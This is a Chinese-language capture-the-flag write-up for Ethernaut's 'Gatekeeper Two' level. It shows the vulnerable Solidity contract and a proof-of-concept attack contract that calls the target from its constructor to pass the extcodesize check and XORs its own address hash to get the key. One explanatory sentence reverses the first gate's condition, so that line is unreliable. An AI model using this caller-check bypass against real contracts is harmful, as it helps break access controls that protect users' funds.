#   Level 14 Gatekeeper Two
實例地址：`0xd01fDc770d466c5C21B76ce888A653fc3B56d3D4`

##  題目說明
守衛帶來了一些新的挑戰，同樣地，你需要注冊為參賽者才能通過這一關。

  可能會有用的資訊

*   回想一下你從上一個守衛那學到了什麽，第一道門是一樣的
*   第二道門的 assembly 關鍵字可以讓合約去存取 Solidity 非原生的功能。參見 Solidity Assembly。在這道門的 extcodesize 函式，可以用來得到給定地址的合約程式碼長度，你可以在 黃皮書 的第七章學到更多相關的資訊。
*   ^ 字元在第三個門裡是位元運算 (XOR)，在這裡是為了應用另一個常見的位元運算手段 (參見 Solidity cheatsheet)。Coin Flip 關卡也是一個想要破這關很好的參考資料。
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

##  POC
該合約有三道要求須要達成即可，第一道發送交易者以及發送訊息者不能不同，我們使用合約呼叫即可，第二道要求呼叫者不能是智能合約，這個與第一道解決方式會發生矛盾。這邊解決方式是在合約建立同時呼叫就可以避免掉這個問題，第三道要求 `key` 與 地址取後 `8 bytes` 互次或需要為最大值，這邊解法我們將建立合約地址取後 `8 bytes`，再取補數幾可達成條件。

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Attack{
    address public target;

    
    constructor(address _target){
        target = _target;
        uint64 temp = ~uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        target.call(abi.encodeWithSignature("enter(bytes8)", bytes8(temp)));
    }

}
```